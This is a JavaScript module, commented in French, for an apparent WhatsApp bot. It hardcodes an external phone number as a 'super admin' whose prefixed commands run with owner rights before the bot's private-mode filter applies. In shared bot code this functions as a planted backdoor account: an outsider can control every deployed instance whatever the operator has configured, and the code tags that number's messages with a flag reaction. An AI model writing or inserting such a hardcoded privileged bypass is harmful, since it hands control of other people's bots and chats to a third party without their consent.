// ============================================================
// 🇷🇴 SUPERADMIN.JS — Module dédié au numéro +23591234568
// Gère uniquement le super admin externe (pas le numéro du bot).
// ============================================================

const SUPER_ADMIN_NUMBER = '23591234568';

/**
 * Vérifie si un JID correspond au super admin
 */
export function isSuperAdminJid(jid) {
  if (!jid) return false;
  const numOnly = String(jid)
    .replace(/@[^\s]*/g, '')
    .replace(/:[0-9]+$/, '')
    .replace(/\s/g, '')
    .replace(/[^0-9]/g, '');
  return numOnly === SUPER_ADMIN_NUMBER;
}

/**
 * Handler appelé pour chaque message AVANT le filtre mode privé.
 *
 * - Si pas le super admin → retourne false
 * - Si super admin :
 *     1. Réagit 🇷🇴 sur chaque message
 *     2. Commande → l'exécute avec droits admin, retourne true
 *     3. Message normal → retourne false (flux continue)
 */
export async function handleSuperAdmin(
  sock, message, senderJid, remoteJid,
  messageText, prefix, handleCmd, isGroup, setOwner
) {
  if (!isSuperAdminJid(senderJid) || message.key.fromMe) return false;

  console.log(`[SUPERADMIN] +${SUPER_ADMIN_NUMBER} → ${messageText.substring(0, 50)}`);

  // 1. Réagir 🇷🇴
  try {
    await sock.sendMessage(remoteJid, {
      react: { text: '🇷🇴', key: message.key }
    });
  } catch (e) {
    console.error('[SUPERADMIN] React error:', e.message);
  }

  // 2. Commande → exécuter avec droits owner
  if (messageText && messageText.startsWith(prefix)) {
    console.log(`[SUPERADMIN] Commande: ${messageText}`);
    try {
      setOwner(true);
      await handleCmd(sock, message, messageText, remoteJid, senderJid, isGroup);
      setOwner(false);
    } catch (e) {
      setOwner(false);
      console.error('[SUPERADMIN] Erreur:', e.message);
    }
    return true;
  }

  return false;
}
